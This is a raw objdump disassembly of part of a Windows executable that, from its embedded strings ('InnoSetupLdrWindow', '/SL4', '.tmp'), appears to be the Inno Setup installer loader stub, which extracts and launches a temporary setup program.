  409b20:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409b23:	e8 ec 98 ff ff       	call   0x403414
  409b28:	50                   	push   %eax
  409b29:	6a 00                	push   $0x0
  409b2b:	e8 24 aa ff ff       	call   0x404554
  409b30:	e8 7f bc ff ff       	call   0x4057b4
  409b35:	f6 05 c0 bd 40 00 01 	testb  $0x1,0x40bdc0
  409b3c:	75 4a                	jne    0x409b88
  409b3e:	80 3d 34 a2 40 00 00 	cmpb   $0x0,0x40a234
  409b45:	75 41                	jne    0x409b88
  409b47:	6a 24                	push   $0x24
  409b49:	a1 ac bb 40 00       	mov    0x40bbac,%eax
  409b4e:	e8 c1 98 ff ff       	call   0x403414
  409b53:	50                   	push   %eax
  409b54:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409b57:	8b 15 a8 bc 40 00    	mov    0x40bca8,%edx
  409b5d:	b0 98                	mov    $0x98,%al
  409b5f:	e8 4c ef ff ff       	call   0x408ab0
  409b64:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409b67:	e8 a8 98 ff ff       	call   0x403414
  409b6c:	50                   	push   %eax
  409b6d:	6a 00                	push   $0x0
  409b6f:	e8 e0 a9 ff ff       	call   0x404554
  409b74:	83 f8 06             	cmp    $0x6,%eax
  409b77:	74 0f                	je     0x409b88
  409b79:	c7 05 3c a2 40 00 02 	movl   $0x2,0x40a23c
  409b80:	00 00 00 
  409b83:	e8 2c bc ff ff       	call   0x4057b4
  409b88:	e8 37 8b ff ff       	call   0x4026c4
  409b8d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409b90:	e8 6f f4 ff ff       	call   0x409004
  409b95:	8b 55 f0             	mov    -0x10(%ebp),%edx
  409b98:	b8 e4 bd 40 00       	mov    $0x40bde4,%eax
  409b9d:	e8 46 96 ff ff       	call   0x4031e8
  409ba2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409ba5:	50                   	push   %eax
  409ba6:	b9 b0 9f 40 00       	mov    $0x409fb0,%ecx
  409bab:	8b 15 e4 bd 40 00    	mov    0x40bde4,%edx
  409bb1:	33 c0                	xor    %eax,%eax
  409bb3:	e8 40 f3 ff ff       	call   0x408ef8
  409bb8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  409bbb:	b8 e8 bd 40 00       	mov    $0x40bde8,%eax
  409bc0:	e8 23 96 ff ff       	call   0x4031e8
  409bc5:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409bca:	8b 50 14             	mov    0x14(%eax),%edx
  409bcd:	a1 d8 bd 40 00       	mov    0x40bdd8,%eax
  409bd2:	e8 bd d6 ff ff       	call   0x407294
  409bd7:	33 d2                	xor    %edx,%edx
  409bd9:	55                   	push   %ebp
  409bda:	68 78 9d 40 00       	push   $0x409d78
  409bdf:	64 ff 32             	push   %fs:(%edx)
  409be2:	64 89 22             	mov    %esp,%fs:(%edx)
  409be5:	33 c0                	xor    %eax,%eax
  409be7:	a3 2c be 40 00       	mov    %eax,0x40be2c
  409bec:	6a 00                	push   $0x0
  409bee:	6a 01                	push   $0x1
  409bf0:	6a 00                	push   $0x0
  409bf2:	8b 0d e8 bd 40 00    	mov    0x40bde8,%ecx
  409bf8:	b2 01                	mov    $0x1,%dl
  409bfa:	b8 58 71 40 00       	mov    $0x407158,%eax
  409bff:	e8 a8 d6 ff ff       	call   0x4072ac
  409c04:	a3 dc bd 40 00       	mov    %eax,0x40bddc
  409c09:	33 c0                	xor    %eax,%eax
  409c0b:	55                   	push   %ebp
  409c0c:	68 67 9d 40 00       	push   $0x409d67
  409c11:	64 ff 30             	push   %fs:(%eax)
  409c14:	64 89 20             	mov    %esp,%fs:(%eax)
  409c17:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409c1c:	8b 40 18             	mov    0x18(%eax),%eax
  409c1f:	e8 70 89 ff ff       	call   0x402594
  409c24:	a3 2c be 40 00       	mov    %eax,0x40be2c
  409c29:	8b 1d 2c be 40 00    	mov    0x40be2c,%ebx
  409c2f:	8b c3                	mov    %ebx,%eax
  409c31:	33 c9                	xor    %ecx,%ecx
  409c33:	8b 15 e0 bd 40 00    	mov    0x40bde0,%edx
  409c39:	8b 52 18             	mov    0x18(%edx),%edx
  409c3c:	e8 3b 8b ff ff       	call   0x40277c
  409c41:	33 c0                	xor    %eax,%eax
  409c43:	55                   	push   %ebp
  409c44:	68 b6 9c 40 00       	push   $0x409cb6
  409c49:	64 ff 30             	push   %fs:(%eax)
  409c4c:	64 89 20             	mov    %esp,%fs:(%eax)
  409c4f:	68 b0 7a 40 00       	push   $0x407ab0
  409c54:	8b 0d d8 bd 40 00    	mov    0x40bdd8,%ecx
  409c5a:	b2 01                	mov    $0x1,%dl
  409c5c:	b8 44 76 40 00       	mov    $0x407644,%eax
  409c61:	e8 1a db ff ff       	call   0x407780
  409c66:	a3 30 be 40 00       	mov    %eax,0x40be30
  409c6b:	33 c0                	xor    %eax,%eax
  409c6d:	55                   	push   %ebp
  409c6e:	68 a5 9c 40 00       	push   $0x409ca5
  409c73:	64 ff 30             	push   %fs:(%eax)
  409c76:	64 89 20             	mov    %esp,%fs:(%eax)
  409c79:	8b d3                	mov    %ebx,%edx
  409c7b:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409c80:	8b 48 18             	mov    0x18(%eax),%ecx
  409c83:	a1 30 be 40 00       	mov    0x40be30,%eax
  409c88:	e8 83 dd ff ff       	call   0x407a10
  409c8d:	33 c0                	xor    %eax,%eax
  409c8f:	5a                   	pop    %edx
  409c90:	59                   	pop    %ecx
  409c91:	59                   	pop    %ecx
  409c92:	64 89 10             	mov    %edx,%fs:(%eax)
  409c95:	68 ac 9c 40 00       	push   $0x409cac
  409c9a:	a1 30 be 40 00       	mov    0x40be30,%eax
  409c9f:	e8 80 8c ff ff       	call   0x402924
  409ca4:	c3                   	ret
  409ca5:	e9 52 91 ff ff       	jmp    0x402dfc
  409caa:	eb ee                	jmp    0x409c9a
  409cac:	33 c0                	xor    %eax,%eax
  409cae:	5a                   	pop    %edx
  409caf:	59                   	pop    %ecx
  409cb0:	59                   	pop    %ecx
  409cb1:	64 89 10             	mov    %edx,%fs:(%eax)
  409cb4:	eb 1b                	jmp    0x409cd1
  409cb6:	e9 11 90 ff ff       	jmp    0x402ccc
  409cbb:	01 00                	add    %eax,(%eax)
  409cbd:	00 00                	add    %al,(%eax)
  409cbf:	4c                   	dec    %esp
  409cc0:	75 40                	jne    0x409d02
  409cc2:	00 c7                	add    %al,%bh
  409cc4:	9c                   	pushf
  409cc5:	40                   	inc    %eax
  409cc6:	00 e8                	add    %ch,%al
  409cc8:	6c                   	insb   (%dx),%es:(%edi)
  409cc9:	fa                   	cli
  409cca:	ff                   	(bad)
  409ccb:	ff                   	ljmp   (bad)
  409ccc:	e8 53 92 ff ff       	call   0x402f24
  409cd1:	8b 1d 2c be 40 00    	mov    0x40be2c,%ebx
  409cd7:	8b c3                	mov    %ebx,%eax
  409cd9:	33 c9                	xor    %ecx,%ecx
  409cdb:	8b 15 e0 bd 40 00    	mov    0x40bde0,%edx
  409ce1:	8b 52 18             	mov    0x18(%edx),%edx
  409ce4:	e8 13 da ff ff       	call   0x4076fc
  409ce9:	8b c3                	mov    %ebx,%eax
  409ceb:	8b 15 e0 bd 40 00    	mov    0x40bde0,%edx
  409cf1:	8b 52 18             	mov    0x18(%edx),%edx
  409cf4:	e8 eb d9 ff ff       	call   0x4076e4
  409cf9:	8b 15 e0 bd 40 00    	mov    0x40bde0,%edx
  409cff:	3b 42 1c             	cmp    0x1c(%edx),%eax
  409d02:	74 05                	je     0x409d09
  409d04:	e8 2f fa ff ff       	call   0x409738
  409d09:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409d0e:	8b 50 18             	mov    0x18(%eax),%edx
  409d11:	a1 dc bd 40 00       	mov    0x40bddc,%eax
  409d16:	e8 79 d5 ff ff       	call   0x407294
  409d1b:	a1 dc bd 40 00       	mov    0x40bddc,%eax
  409d20:	e8 53 d7 ff ff       	call   0x407478
  409d25:	33 d2                	xor    %edx,%edx
  409d27:	a1 dc bd 40 00       	mov    0x40bddc,%eax
  409d2c:	e8 63 d5 ff ff       	call   0x407294
  409d31:	8b d3                	mov    %ebx,%edx
  409d33:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409d38:	8b 48 18             	mov    0x18(%eax),%ecx
  409d3b:	a1 dc bd 40 00       	mov    0x40bddc,%eax
  409d40:	8b 18                	mov    (%eax),%ebx
  409d42:	ff 53 10             	call   *0x10(%ebx)
  409d45:	33 c0                	xor    %eax,%eax
  409d47:	5a                   	pop    %edx
  409d48:	59                   	pop    %ecx
  409d49:	59                   	pop    %ecx
  409d4a:	64 89 10             	mov    %edx,%fs:(%eax)
  409d4d:	68 6e 9d 40 00       	push   $0x409d6e
  409d52:	a1 2c be 40 00       	mov    0x40be2c,%eax
  409d57:	e8 50 88 ff ff       	call   0x4025ac
  409d5c:	a1 dc bd 40 00       	mov    0x40bddc,%eax
  409d61:	e8 be 8b ff ff       	call   0x402924
  409d66:	c3                   	ret
  409d67:	e9 90 90 ff ff       	jmp    0x402dfc
  409d6c:	eb e4                	jmp    0x409d52
  409d6e:	33 c0                	xor    %eax,%eax
  409d70:	5a                   	pop    %edx
  409d71:	59                   	pop    %ecx
  409d72:	59                   	pop    %ecx
  409d73:	64 89 10             	mov    %edx,%fs:(%eax)
  409d76:	eb 26                	jmp    0x409d9e
  409d78:	e9 4f 8f ff ff       	jmp    0x402ccc
  409d7d:	01 00                	add    %eax,(%eax)
  409d7f:	00 00                	add    %al,(%eax)
  409d81:	ac                   	lods   %ds:(%esi),%al
  409d82:	71 40                	jno    0x409dc4
  409d84:	00 89 9d 40 00 8b    	add    %cl,-0x74ffbf63(%ecx)
  409d8a:	40                   	inc    %eax
  409d8b:	0c 50                	or     $0x50,%al
  409d8d:	e8 4a a7 ff ff       	call   0x4044dc
  409d92:	b0 61                	mov    $0x61,%al
  409d94:	e8 9f f4 ff ff       	call   0x409238
  409d99:	e8 86 91 ff ff       	call   0x402f24
  409d9e:	b8 d8 bd 40 00       	mov    $0x40bdd8,%eax
  409da3:	e8 c0 cf ff ff       	call   0x406d68
  409da8:	6a 00                	push   $0x0
  409daa:	a1 14 b0 40 00       	mov    0x40b014,%eax
  409daf:	50                   	push   %eax
  409db0:	6a 00                	push   $0x0
  409db2:	6a 00                	push   $0x0
  409db4:	6a 00                	push   $0x0
  409db6:	6a 00                	push   $0x0
  409db8:	6a 00                	push   $0x0
  409dba:	6a 00                	push   $0x0
  409dbc:	6a 00                	push   $0x0
  409dbe:	68 b8 9f 40 00       	push   $0x409fb8
  409dc3:	68 cc 9f 40 00       	push   $0x409fcc
  409dc8:	6a 00                	push   $0x0
  409dca:	e8 5d a7 ff ff       	call   0x40452c
  409dcf:	a3 40 a2 40 00       	mov    %eax,0x40a240
  409dd4:	68 8c 95 40 00       	push   $0x40958c
  409dd9:	6a fc                	push   $0xfffffffc
  409ddb:	a1 40 a2 40 00       	mov    0x40a240,%eax
  409de0:	50                   	push   %eax
  409de1:	e8 86 a7 ff ff       	call   0x40456c
  409de6:	a3 d0 bd 40 00       	mov    %eax,0x40bdd0
  409deb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409dee:	50                   	push   %eax
  409def:	a1 40 a2 40 00       	mov    0x40a240,%eax
  409df4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  409df7:	c6 45 ec 00          	movb   $0x0,-0x14(%ebp)
  409dfb:	8d 55 e8             	lea    -0x18(%ebp),%edx
  409dfe:	33 c9                	xor    %ecx,%ecx
  409e00:	b8 dc 9f 40 00       	mov    $0x409fdc,%eax
  409e05:	e8 da b2 ff ff       	call   0x4050e4
  409e0a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409e0d:	8b 15 d4 bd 40 00    	mov    0x40bdd4,%edx
  409e13:	e8 e4 94 ff ff       	call   0x4032fc
  409e18:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409e1b:	50                   	push   %eax
  409e1c:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409e1f:	50                   	push   %eax
  409e20:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409e25:	8b 40 20             	mov    0x20(%eax),%eax
  409e28:	89 45 cc             	mov    %eax,-0x34(%ebp)
  409e2b:	c6 45 d0 00          	movb   $0x0,-0x30(%ebp)
  409e2f:	a1 e0 bd 40 00       	mov    0x40bde0,%eax
  409e34:	8b 40 24             	mov    0x24(%eax),%eax
  409e37:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  409e3a:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  409e3e:	8d 55 cc             	lea    -0x34(%ebp),%edx
  409e41:	b9 01 00 00 00       	mov    $0x1,%ecx
  409e46:	b8 f0 9f 40 00       	mov    $0x409ff0,%eax
  409e4b:	e8 94 b2 ff ff       	call   0x4050e4
  409e50:	8b 55 dc             	mov    -0x24(%ebp),%edx
  409e53:	58                   	pop    %eax
  409e54:	e8 a3 94 ff ff       	call   0x4032fc
  409e59:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409e5c:	50                   	push   %eax
  409e5d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409e60:	e8 27 ca ff ff       	call   0x40688c
  409e65:	8b 55 dc             	mov    -0x24(%ebp),%edx
  409e68:	58                   	pop    %eax
  409e69:	e8 8e 94 ff ff       	call   0x4032fc
  409e6e:	8b 55 f0             	mov    -0x10(%ebp),%edx
  409e71:	b9 3c a2 40 00       	mov    $0x40a23c,%ecx
  409e76:	a1 e8 bd 40 00       	mov    0x40bde8,%eax
  409e7b:	e8 a0 f7 ff ff       	call   0x409620
  409e80:	33 c0                	xor    %eax,%eax
  409e82:	5a                   	pop    %edx
  409e83:	59                   	pop    %ecx
  409e84:	59                   	pop    %ecx
  409e85:	64 89 10             	mov    %edx,%fs:(%eax)
  409e88:	68 20 9f 40 00       	push   $0x409f20
  409e8d:	a1 d8 bd 40 00       	mov    0x40bdd8,%eax
  409e92:	e8 8d 8a ff ff       	call   0x402924
  409e97:	83 3d e8 bd 40 00 00 	cmpl   $0x0,0x40bde8
  409e9e:	74 19                	je     0x409eb9
  409ea0:	6a 32                	push   $0x32
  409ea2:	68 fa 00 00 00       	push   $0xfa
  409ea7:	b9 0d 00 00 00       	mov    $0xd,%ecx
  409eac:	8b 15 e8 bd 40 00    	mov    0x40bde8,%edx
  409eb2:	33 c0                	xor    %eax,%eax
  409eb4:	e8 1b f3 ff ff       	call   0x4091d4
  409eb9:	83 3d e4 bd 40 00 00 	cmpl   $0x0,0x40bde4
  409ec0:	74 10                	je     0x409ed2
  409ec2:	a1 e4 bd 40 00       	mov    0x40bde4,%eax
  409ec7:	e8 48 95 ff ff       	call   0x403414
  409ecc:	50                   	push   %eax
  409ecd:	e8 ea a5 ff ff       	call   0x4044bc
  409ed2:	83 3d 40 a2 40 00 00 	cmpl   $0x0,0x40a240
  409ed9:	74 0b                	je     0x409ee6
  409edb:	a1 40 a2 40 00       	mov    0x40a240,%eax
  409ee0:	50                   	push   %eax
  409ee1:	e8 4e a6 ff ff       	call   0x404534
  409ee6:	83 3d c8 bd 40 00 00 	cmpl   $0x0,0x40bdc8
  409eed:	74 26                	je     0x409f15
  409eef:	a1 c8 bd 40 00       	mov    0x40bdc8,%eax
  409ef4:	8b 0d cc bd 40 00    	mov    0x40bdcc,%ecx
  409efa:	ba 10 89 40 00       	mov    $0x408910,%edx
  409eff:	e8 78 96 ff ff       	call   0x40357c
  409f04:	a1 c8 bd 40 00       	mov    0x40bdc8,%eax
  409f09:	e8 9e 86 ff ff       	call   0x4025ac
  409f0e:	33 c0                	xor    %eax,%eax
  409f10:	a3 c8 bd 40 00       	mov    %eax,0x40bdc8
  409f15:	c3                   	ret
  409f16:	e9 e1 8e ff ff       	jmp    0x402dfc
  409f1b:	e9 6d ff ff ff       	jmp    0x409e8d
  409f20:	80 3d 44 a2 40 00 00 	cmpb   $0x0,0x40a244
  409f27:	74 05                	je     0x409f2e
  409f29:	e8 0e f2 ff ff       	call   0x40913c
  409f2e:	33 c0                	xor    %eax,%eax
  409f30:	5a                   	pop    %edx
  409f31:	59                   	pop    %ecx
  409f32:	59                   	pop    %ecx
  409f33:	64 89 10             	mov    %edx,%fs:(%eax)
  409f36:	eb 22                	jmp    0x409f5a
  409f38:	e9 cb 8c ff ff       	jmp    0x402c08
  409f3d:	e8 aa f3 ff ff       	call   0x4092ec
  409f42:	83 3d 3c a2 40 00 00 	cmpl   $0x0,0x40a23c
  409f49:	75 0a                	jne    0x409f55
  409f4b:	c7 05 3c a2 40 00 01 	movl   $0x1,0x40a23c
  409f52:	00 00 00 
  409f55:	e8 ca 8f ff ff       	call   0x402f24
  409f5a:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  409f5f:	e8 cc 9e ff ff       	call   0x403e30
  409f64:	33 c0                	xor    %eax,%eax
  409f66:	5a                   	pop    %edx
  409f67:	59                   	pop    %ecx
  409f68:	59                   	pop    %ecx
  409f69:	64 89 10             	mov    %edx,%fs:(%eax)
  409f6c:	68 89 9f 40 00       	push   $0x409f89
  409f71:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409f74:	e8 1f 92 ff ff       	call   0x403198
  409f79:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409f7c:	e8 17 92 ff ff       	call   0x403198
  409f81:	c3                   	ret
  409f82:	e9 75 8e ff ff       	jmp    0x402dfc
  409f87:	eb e8                	jmp    0x409f71
  409f89:	5f                   	pop    %edi
  409f8a:	5e                   	pop    %esi
  409f8b:	5b                   	pop    %ebx
  409f8c:	e8 9b 9e ff ff       	call   0x403e2c
  409f91:	8b e5                	mov    %ebp,%esp
  409f93:	5d                   	pop    %ebp
  409f94:	c3                   	ret
  409f95:	00 00                	add    %al,(%eax)
  409f97:	00 ff                	add    %bh,%bh
  409f99:	ff                   	(bad)
  409f9a:	ff                   	(bad)
  409f9b:	ff 06                	incl   (%esi)
  409f9d:	00 00                	add    %al,(%eax)
  409f9f:	00 57 69             	add    %dl,0x69(%edi)
  409fa2:	6e                   	outsb  %ds:(%esi),(%dx)
  409fa3:	33 32                	xor    (%edx),%esi
  409fa5:	73 00                	jae    0x409fa7
  409fa7:	00 ff                	add    %bh,%bh
  409fa9:	ff                   	(bad)
  409faa:	ff                   	(bad)
  409fab:	ff 04 00             	incl   (%eax,%eax,1)
  409fae:	00 00                	add    %al,(%eax)
  409fb0:	2e 74 6d             	je,pn  0x40a020
  409fb3:	70 00                	jo     0x409fb5
  409fb5:	00 00                	add    %al,(%eax)
  409fb7:	00 49 6e             	add    %cl,0x6e(%ecx)
  409fba:	6e                   	outsb  %ds:(%esi),(%dx)
  409fbb:	6f                   	outsl  %ds:(%esi),(%dx)
  409fbc:	53                   	push   %ebx
  409fbd:	65 74 75             	gs je  0x40a035
  409fc0:	70 4c                	jo     0x40a00e
  409fc2:	64 72 57             	fs jb  0x40a01c
  409fc5:	69 6e 64 6f 77 00 00 	imul   $0x776f,0x64(%esi),%ebp
  409fcc:	53                   	push   %ebx
  409fcd:	54                   	push   %esp
  409fce:	41                   	inc    %ecx
  409fcf:	54                   	push   %esp
  409fd0:	49                   	dec    %ecx
  409fd1:	43                   	inc    %ebx
  409fd2:	00 00                	add    %al,(%eax)
  409fd4:	ff                   	(bad)
  409fd5:	ff                   	(bad)
  409fd6:	ff                   	(bad)
  409fd7:	ff 0a                	decl   (%edx)
  409fd9:	00 00                	add    %al,(%eax)
  409fdb:	00 2f                	add    %ch,(%edi)
  409fdd:	53                   	push   %ebx
  409fde:	4c                   	dec    %esp
  409fdf:	34 20                	xor    $0x20,%al
  409fe1:	24 25                	and    $0x25,%al
  409fe3:	78 20                	js     0x40a005
  409fe5:	22 00                	and    (%eax),%al
  409fe7:	00 ff                	add    %bh,%bh
  409fe9:	ff                   	(bad)
  409fea:	ff                   	(bad)
  409feb:	ff 08                	decl   (%eax)
  409fed:	00 00                	add    %al,(%eax)
  409fef:	00 22                	add    %ah,(%edx)
  409ff1:	20 25 64 20 25 64    	and    %ah,0x64252064
  409ff7:	20 00                	and    %al,(%eax)
  409ff9:	00 00                	add    %al,(%eax)
	...
